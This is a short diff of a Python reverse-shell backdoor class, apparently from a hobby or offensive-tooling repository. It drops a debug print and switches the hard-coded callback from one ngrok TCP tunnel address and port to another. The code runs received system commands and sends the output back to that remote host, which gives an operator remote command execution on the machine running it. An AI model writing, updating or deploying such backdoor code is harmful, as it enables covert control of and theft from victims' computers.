@@ -81,7 +81,6 @@ class Backdoor:
                 else:
                     command_result = self.execute_system_command(command)
 
-                print("[!] cmd res type", type(command_result))
                 self.reliable_send(command_result)
 
             #except Exception:
@@ -90,8 +89,8 @@ class Backdoor:
 
 
 if __name__ == "__main__":
-    ip = "7.tcp.eu.ngrok.io"
-    port = 12436
+    ip = "2.tcp.eu.ngrok.io"
+    port = 12664
 
     backdoor = Backdoor(ip, port)
     backdoor.run()
